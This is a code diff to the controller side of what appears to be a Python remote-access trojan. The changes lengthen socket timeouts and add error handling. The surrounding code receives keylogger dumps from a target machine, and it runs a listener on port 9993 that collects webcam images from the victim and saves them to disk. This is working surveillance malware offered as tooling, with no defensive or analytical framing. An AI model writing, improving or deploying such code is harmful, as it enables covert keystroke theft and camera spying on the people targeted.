@@ -27,7 +27,7 @@ except KeyboardInterrupt:
 
 def recv_keylog():
     try:
-        _target.settimeout(3)
+        _target.settimeout(7)
         print("Dumping logs:")
         data = _target.recv(1024).decode()
         print(data)
@@ -35,31 +35,35 @@ def recv_keylog():
         print("No dump received, continuing")
 
 def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((host, port))
-    server.listen(1)
+    try:
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.settimeout(23)
+        server.bind((host, port))
+        server.listen(1)
 
-    print(Fore.BLUE+"connecting")
-    conn, addr = server.accept()
-    print(Fore.RED+f"connected {addr}")
+        print(Fore.BLUE+"connecting")
+        conn, addr = server.accept()
+        print(Fore.RED+f"connected {addr}")
 
-    size_data = conn.recv(4)
-    size = struct.unpack("!I", size_data)[0]
+        size_data = conn.recv(4)
+        size = struct.unpack("!I", size_data)[0]
 
-    data = b""
-    while len(data) < size:
-        packet = conn.recv(4096)
-        if not packet:
-            break
-        data += packet
+        data = b""
+        while len(data) < size:
+            packet = conn.recv(4096)
+            if not packet:
+                break
+            data += packet
 
-    with open(save_as, "wb") as f:
-        f.write(data)
+        with open(save_as, "wb") as f:
+            f.write(data)
 
-    print(Fore.BLUE+f'saved as {save_as}')
+        print(Fore.BLUE+f'saved as {save_as}')
 
-    conn.close()
-    server.close()
+        conn.close()
+        server.close()
+    except socket.timeout:
+        print("Can't access camera")
 
 
 def keystroke():
